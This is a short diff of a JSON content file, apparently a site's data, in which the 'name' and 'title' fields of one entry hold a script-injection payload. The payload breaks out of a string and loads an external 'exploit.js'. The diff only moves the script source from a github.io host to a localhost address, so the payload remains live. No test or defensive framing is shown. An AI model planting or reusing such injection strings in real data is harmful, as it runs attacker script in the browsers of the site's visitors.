@@ -4,11 +4,11 @@
       "style": "full"
     },
     "n1": {
-      "name": "'); var s = document.createElement('script'); s.src = 'https://miko-ko-byte.github.io/exploit.js'; document.head.appendChild(s); //",
+      "name": "'); var s = document.createElement('script'); s.src = 'http://127.0.0.1:5500/exploit.js'; document.head.appendChild(s); //",
       "desc": "Test Description",
       "upload": "2023-10-01",
       "img": "https://miko-ko-byte.github.io/hehe.png",
-      "patch": "././fucku.mp4",
-      "title": "'); var s = document.createElement('script'); s.src = 'https://miko-ko-byte.github.io/exploit.js'; document.head.appendChild(s); //"
+      "patch": "./fucku.mp4",
+      "title": "'); var s = document.createElement('script'); s.src = 'http://127.0.0.1:5500/exploit.js'; document.head.appendChild(s); //"
     }
   }
